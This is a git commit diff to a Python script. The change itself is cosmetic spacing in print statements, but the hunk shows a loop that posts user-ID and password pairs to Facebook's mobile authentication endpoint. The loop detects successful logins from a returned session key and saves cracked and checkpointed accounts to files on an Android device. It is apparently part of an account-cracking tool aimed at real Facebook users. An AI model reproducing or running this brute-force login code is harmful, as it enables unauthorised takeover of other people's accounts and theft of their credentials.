ba6f4684617fd83db4af03c94067550d9427d9c8
Art <121850372+arterxsk@users.noreply.github.com>
2023-12-01 12:43:38 +0800

    update x.py

--- x.py
+++ x.py
@@ -488,17 +488,17 @@ def gxds_files(uid, pxss):
             p = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False).text
             lxgin=json.loads(p)
             if "session_key" in lxgin:
-                print("\r\r\033[1;32m  [GXDS-✓] " + uid + ":" + ps + " -\033[0;35m " + yxxr(uid))
+                print("\r\r\033[1;32m  [GXDS-✓] " + uid + ":" + ps + " - \033[0;35m " + yxxr(uid))
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
                 oks.append(uid)
                 break
             elif "www.facebook.com" in lxgin:
-                print("\r\r\033[0;31m  [GXDS-X] " + uid + ":" + ps + " -\033[0;35m " + yxxr(uid))
+                print("\r\r\033[0;31m  [GXDS-X] " + uid + ":" + ps + " - \033[0;35m " + yxxr(uid))
                 open("/sdcard/gxds-cp.txt", "a").write(uid + "|" + ps + "\n")
                 cps.append(uid)
                 break
             else:
-                print("\r\r\033[0;31m  [GXDS-X] " + uid + ":" + ps + " -\033[0;35m" + yxxr(uid))
+                print("\r\r\033[0;31m  [GXDS-X] " + uid + ":" + ps + " - \033[0;35m" + yxxr(uid))
                 open("/sdcard/gxds-logs.txt", "a").write(uid + "|" + ps + "\n")
                 continue
         loop += 1
